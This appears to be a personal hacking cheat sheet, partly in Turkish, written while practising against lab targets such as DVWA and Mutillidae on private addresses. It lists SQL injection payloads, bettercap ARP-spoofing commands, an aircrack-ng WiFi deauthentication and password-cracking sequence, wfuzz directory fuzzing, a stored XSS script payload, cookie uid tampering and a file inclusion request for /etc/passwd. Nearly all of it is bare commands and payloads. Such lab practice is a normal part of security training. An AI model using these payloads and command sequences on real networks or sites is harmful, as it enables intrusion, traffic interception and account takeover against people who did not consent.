SQL INJECTION ?go=https://

 ‘ ORDER BY 1--
‘ ORDER BY 2--
‘ ORDER BY 3--

 ‘ UNION SELECT NULL --
‘ UNION SELECT NULL NULL --
‘ UNION SELECT NULL NULL NULL --



‘ order by 3#
‘ union select database(), version()#
1’ or ‘1’=’1
1’ sleep(5)#


##### **MITM**

bettercap iface eth0 

net.probe on
net.show


help arp.spoof
set arp.spoof.fullduplex True
set arp.spoof.targets 192.168.58.2

help. net.sniff


##### **WIFI HACK**

`sudo airmon-ng start wlan0 - monitor mode`

`sudo airodump-ng wlan0 - izlemek için`

`sudo airodump-ng --bssid <Hedef MAC Adresi> -c <kanal no> wlan0`

`sudo airodump-ng -c Hedef Cihaz Kanal No --bssid Hedef Cihaz MAC Adresi -w /root/kali/Desktop/deneme.cap wlan0` 

`sudo aireplay-ng --deauth 0 -a Hedef Cihaz MAC Adresi –c Hedefe Bağlı Olan istemci MAC Adresi wlan0`

*`sudo aircrack-ng –w /home/kali/Desktop/rockyou.txt  /home/kali/Desktop/deneme-01.cap`*

##### **WEB HACK**
_/var/www/html/test/_  
apache server  

`wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.16.5/FUZZ)`  
  
192.168.16.5/dvwa/FUZZ

  
  
[http://192.168.16.5/mutillidae/index.php?page=set-background-color.php](http://192.168.16.5/mutillidae/index.php?page=set-background-color.php)  
  
213245;font-size:40px  
XSS için  
<script>alert("Hacked");</script>  
sonrasında  
[http://192.168.16.5/mutillidae/index.php?page=add-to-your-blog.php](http://192.168.16.5/mutillidae/index.php?page=add-to-your-blog.php)  
reload atınca hep geliyor  

cookies kısmından uid değişitip kullanıcı değişebiliyorsun  
[http://192.168.16.5/mutillidae/index.php?page=/etc/passwd](http://192.168.16.5/mutillidae/index.php?page=/etc/passwd)


Fotoğraftaki dosya yolu tam olarak şudur:

`/var/www/mutillidae/config.inc` owasp10

http://192.168.58.202/mutillidae/index.php?page=/etc/passwd




